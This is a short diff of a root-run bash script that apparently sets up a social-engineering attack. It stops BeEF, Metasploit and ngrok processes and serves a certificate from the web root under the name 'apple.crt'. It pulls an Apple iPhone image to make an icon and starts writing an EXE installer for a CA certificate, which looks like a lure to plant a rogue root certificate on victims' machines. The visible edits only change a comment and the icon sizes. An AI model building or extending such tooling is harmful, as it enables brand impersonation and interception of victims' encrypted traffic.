@@ -34,7 +34,7 @@ color_print() {
 # --- Root Check ---
 [[ "$(id -u)" -ne 0 ]] && { color_print RED "[X] Please run as ROOT..."; exit 1; }
 
-# --- Kill previous BeEF/Metasploit processes ---
+# --- Kill previous processes ---
 pkill -f 'ngrok|ruby|msfconsole|apache2'
 
 # --- Tool Check ---
@@ -63,7 +63,7 @@ cp "$CERT_CRT" "/var/www/html/apple.crt"
 
 # --- Download and Process Image ---
 wget "https://www.apple.com/v/iphone-16-pro/f/images/overview/product-viewer/iphone-pro/all_colors__fdpduog7urm2_large_2x.jpg" -O /tmp/apple.jpg
-convert "/tmp/apple.jpg" -define icon:auto-resize=256,128,64,48,32,16 "/tmp/apple.ico"
+convert "/tmp/apple.jpg" -define icon:auto-resize=96 "/tmp/apple.ico"
 
 # --- Generate EXE Installer for CA ---
 cat > /tmp/cert_installer.py << EOF
